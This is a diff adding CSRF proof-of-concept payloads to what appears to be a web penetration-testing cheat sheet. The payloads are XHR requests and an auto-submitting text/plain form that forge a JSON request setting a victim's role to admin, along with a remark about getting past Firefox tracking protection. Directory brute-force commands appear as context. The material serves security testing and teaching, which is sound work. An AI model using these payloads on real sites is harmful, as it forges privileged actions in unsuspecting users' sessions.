@@ -1153,7 +1153,7 @@ dirb http://target.com/ wordlist.txt
 gobuster dir -u http://target.com/ -w wordlist.txt
 ```
 
-## 5. Cross-Site Request Forgery (CSRF)
+## Cross-Site Request Forgery (CSRF)
 
 ### Exploitation:
 #### Logout CSRF:
@@ -1164,6 +1164,58 @@ gobuster dir -u http://target.com/ -w wordlist.txt
 1. Capture a profile update request.
 2. Change `email` field in CSRF PoC.
 3. Open PoC in browser and submit.
+
+### JSON GET - Simple Request
+
+```html
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "http://www.example.com/api/currentuser");
+xhr.send();
+</script>
+```
+
+
+### JSON POST - Simple Request
+
+With XHR :
+
+```html
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "http://www.example.com/api/setrole");
+//application/json is not allowed in a simple request. text/plain is the default
+xhr.setRequestHeader("Content-Type", "text/plain");
+//You will probably want to also try one or both of these
+//xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+//xhr.setRequestHeader("Content-Type", "multipart/form-data");
+xhr.send('{"role":admin}');
+</script>
+```
+
+With autosubmit send form, which bypasses certain browser protections such as the Standard option of [Enhanced Tracking Protection](https://support.mozilla.org/en-US/kb/enhanced-tracking-protection-firefox-desktop?as=u&utm_source=inproduct#w_standard-enhanced-tracking-protection) in Firefox browser :
+
+```html
+<form id="CSRF_POC" action="www.example.com/api/setrole" enctype="text/plain" method="POST">
+// this input will send : {"role":admin,"other":"="}
+ <input type="hidden" name='{"role":admin, "other":"'  value='"}' />
+</form>
+<script>
+ document.getElementById("CSRF_POC").submit();
+</script>
+```
+
+### JSON POST - Complex Request
+
+```html
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open("POST", "http://www.example.com/api/setrole");
+xhr.withCredentials = true;
+xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+xhr.send('{"role":admin}');
+</script>
+```
 
 ## 6. Two-Factor Authentication (2FA) Bypass
 
